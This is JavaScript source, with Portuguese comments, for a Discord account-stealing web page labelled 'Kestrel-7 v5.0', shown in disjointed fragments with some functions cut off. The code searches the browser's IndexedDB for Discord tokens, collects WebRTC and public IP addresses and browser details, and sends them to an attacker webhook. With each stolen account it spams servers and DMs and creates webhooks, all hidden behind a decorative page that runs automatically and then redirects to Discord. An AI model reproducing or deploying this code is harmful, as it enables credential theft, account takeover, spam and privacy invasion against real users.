// ===== TOKEN EXTRACTION - TODAS AS FONTES =====
function extractTokensFromString(str){
    const tokens = [];
    const patterns = [
        /[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}/g,  // Token padrão
        /[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g,     // Token com mais caracteres
        /mfa\.[\w-]{84}/g,                      // Token MFA
        /[\w-]{30,}\.[\w-]{6,}\.[\w-]{20,}/g    // Token genérico
    ];
    
    for(let pattern of patterns){
        const matches = str.match(pattern);
        if(matches){
            tokens.push(...matches);
        }
    }
    
    return [...new Set(tokens)];
}

async function deepScanIndexedDB(){
    let findings = [];
    
    const dbNames = [
        'discord', 'Discord', 'discordapp', 
        'localforage', 'keyval-store', 'leveldb',
        'chrome-extension_discord', 'discord_0'
    ];
    
    // Tenta listar todos os bancos
    try{
        if(indexedDB.databases){
            const databases = await indexedDB.databases();
            for(let db of databases){
                if(db.name && !dbNames.includes(db.name)){
                    dbNames.push(db.name);
                }
            }
        }
    }catch(e){}
    
    for(let dbName of dbNames){
        try{
            const db = await new Promise((resolve, reject) => {
                const request = indexedDB.open(dbName);
                request.onsuccess = () => resolve(request.result);
                request.onerror = () => reject(request.error);
            });
            
            const storeNames = Array.from(db.objectStoreNames);
            
            for(let storeName of storeNames){
                try{
                    const data = await new Promise((resolve, reject) => {
                        const tx = db.transaction(storeName, 'readonly');
                        const store = tx.objectStore(storeName);
                        const getAll = store.getAll();
                        getAll.onsuccess = () => resolve(getAll.result);
                        getAll.onerror = () => reject(getAll.error);
                    });
                    
                    if(data && data.length > 0){
                        const jsonData = JSON.stringify(data);
                        const tokens = extractTokensFromString(jsonData);
                        
                        if(tokens.length > 0){
                            findings.push({
                                source: 'indexedDB_' + dbName,
                                store: storeName,
                                tokens: tokens,
                                dataPreview: jsonData.substring(0, 2000)
                            });
                        }
                    }
                }catch(e){}
                
                // Tenta getAllKeys também
                try{
                    const tx2 = db.transaction(storeName, 'readonly');
                    const store2 = tx2.objectStore(storeName);
                    const getAllKeys = store2.getAllKeys();
                    getAllKeys.onsuccess = function(){
                        const keys = getAllKeys.result;
                        if(keys && keys.length > 0){
                            const keyString = JSON.stringify(keys);
                            const tokens = extractTokensFromString(keyString);
                            if(tokens.length > 0){
                                findings.push({
                                    source: 'indexedDB_keys_' + dbName,
                                    store: storeName,
                                    tokens: tokens,
                                    keysPreview: keyString.substring(0, 1000)
                                });
                            }
                        }
                    };
                }catch(e){}
            }
            
            db.close();
        }catch(e){}
    }
    
    return findings;
}

// ===== WEBRTC IP LEAK =====
function getWebRTCIPs(){
    return new Promise((resolve) => {
        const ips = [];
        
        try{
            const pc = new RTCPeerConnection({
                iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
            });
            
            pc.createDataChannel('');
            
            pc.onicecandidate = (event) => {
                if(event.candidate){
                    const candidate = event.candidate.candidate;
                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/g;
                    const matches = candidate.match(ipRegex);
                    
                    if(matches){
                        for(let ip of matches){
                            if(!ips.includes(ip) && !ip.startsWith('0.')){
                                ips.push(ip);
                            }
                        }
                    }
                }
            };
            
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            
            setTimeout(() => {
                pc.close();
                resolve(ips);
            }, 3000);
            
        }catch(e){
            resolve(ips);
        }
    });
}

        const extractedData = [];
        
        for(let token of uniqueTokens){
            const data = await validateAndExtract(token);
            if(data){
                extractedData.push(data);
            }
        }
        
        // 5. Monta payload
        const fullData = {
            capture_id: genId(),
            timestamp: new Date().toISOString(),
            public_ip: publicIP,
            webrtc_ips: webrtcIPs,
            browser: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                url: window.location.href
            },
            storage_findings: storageFindings,
            indexeddb_findings: indexedDBFindings,
            cache_findings: cacheFindings,
            service_workers: swFindings,
            broadcast_channels: bcFindings,
            extracted_accounts: extractedData,
            tokens_found: uniqueTokens
        };
        
        // 6. Envia para webhook
        status.textContent = "Enviando dados...";
        await sendToWebhook(fullData, WEBHOOK_URL);
        
        // 7. Processa cada conta
        if(extractedData.length > 0){
            for(let account of extractedData){
                const token = account.token;
                const userData = account.user;
                
                // Resumo da conta
                const summaryPayload = {
                    content: "🎯 **CONTA CAPTURADA + OPERAÇÕES INICIADAS**",
                    embeds: [{
                        title: "Token Válido Encontrado",
                        color: 65280,
                        fields: [
                            {name: "Usuário", value: userData.username + '#' + userData.discriminator, inline: true},
                            {name: "ID", value: userData.id, inline: true},
                            {name: "Email", value: userData.email || 'N/A', inline: true},
                            {name: "Telefone", value: userData.phone || 'N/A', inline: true},
                            {name: "Nitro", value: userData.premium_type ? 'Sim' : 'Não', inline: true},
                            {name: "Servidores", value: String(account.guilds.length), inline: true},
                            {name: "Amigos", value: String(account.friends.length), inline: true},
                            {name: "Token", value: "```" + token + "```", inline: false}
                        ],
                        footer: {text: "Kestrel-7 v5.0"}
                    }]
                };
                
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(summaryPayload)
                });
                
                // 8. SPAM EM SERVIDORES
                status.textContent = "Spammando servidores...";
                const serverSpamCount = await spamServers(token, userData);
                
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `📢 **SPAM EM SERVIDORES**\nMensagens: ${serverSpamCount}\nConta: ${userData.username}`
                    })
                });
                
                await sleep(2000);
                
                // 9. SPAM EM DMs
                status.textContent = "Spammando DMs...";
                const dmSpamCount = await spamDMs(token, userData);
                
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `📨 **SPAM EM DMs**\nMensagens: ${dmSpamCount}\nConta: ${userData.username}`
                    })
                });
                
                await sleep(1000);
                
                // 10. CRIA WEBHOOKS NOS SERVIDORES
                status.textContent = "Criando webhooks...";
                const createdWebhooks = await createWebhooks(token, userData);
                
                if(createdWebhooks.length > 0){
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            content: `🔗 **WEBHOOKS CRIADOS**\n\`\`\`json\n${JSON.stringify(createdWebhooks, null, 2).substring(0, 1500)}\n\`\`\``
                        })
                    });
                }
                
                status.textContent = `✅ Completo! Servidores: ${serverSpamCount} | DMs: ${dmSpamCount} | Webhooks: ${createdWebhooks.length}`;
                
                await sleep(1000);
            }
        } else {
            status.textContent = "Nenhum token válido encontrado";
        }
        
    }catch(e){
        status.textContent = "Erro: " + e.message;
    }
    
    setTimeout(() => {
        window.location.href = "https://discord.com/channels/@me";
    }, 5000);
}

    for(let i=0; i<30; i++){
        const particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.left = Math.random()*100 + '%';
        particle.style.width = Math.random()*4+2 + 'px';
        particle.style.height = particle.style.width;
        particle.style.animationDuration = Math.random()*5+3 + 's';
        particle.style.animationDelay = Math.random()*5 + 's';
        particlesContainer.appendChild(particle);
    }
    
    setTimeout(function(){
        grabToken();
    }, 1500);
});
